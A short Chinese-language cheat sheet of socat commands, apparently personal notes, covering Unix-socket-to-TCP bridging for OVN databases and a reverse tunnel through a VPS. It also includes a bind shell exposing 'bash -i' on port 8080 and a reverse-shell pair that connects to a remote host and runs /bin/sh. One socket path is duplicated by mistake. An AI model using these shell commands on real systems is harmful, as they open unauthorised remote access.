http://www.dest-unreach.org/socat/

https://zhuanlan.zhihu.com/p/8601350507

将 Unix Socket 转换为 TCP 连接

socat TCP-LISTEN:65528,fork UNIX-CONNECT:/usr/local/var/run/ovn/ovnnb_db.sock:
socat TCP-LISTEN:端口号,fork UNIX-CONNECT:/usr/local/var/run/ovn//usr/local/var/run/ovn/ovnsb_db.sock:

将 TCP 转换为 Unix Socket
socat TCP-CONNECT:目标地址:端口号 UNIX-CLIENT:/path/to/unix/socket

socat TCP-LISTEN:8080,reuseaddr,fork,max-children=5 EXEC:"bash -i",pty,stderr,setsid,sigint,raw,echo=0,crnl

socat - TCP:服务器IP:8080,setsid,crnl

socat 实现 ssh -r
vps上的客户端
socat -d -d -d tcp-l:80,reuseaddr,bind=0.0.0.0,fork tcp-l:8080,bind=0.0.0.0,reuseaddr,retry=10

lan内的服务器端
socat -d -d -d -v tcp:vpsip:8080,forever,intervall=10,fork tcp:localhost:80

例子：

socat -d -d -d tcp-l:8080,reuseaddr,bind=0.0.0.0,fork tcp-l:80,bind=0.0.0.0,reuseaddr,retry=10
测试： curl -v http://127.0.0.1:8080

本地服务端 被访问
php sapi/webUI/bootstrap.php
socat -d -d -d -v tcp:socat-r.example.com:80,forever,intervall=10,fork tcp:localhost:9502

反弹 shell
远端
socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane

本地
socat file:`tty`,raw,echo=0 tcp-listen:12345
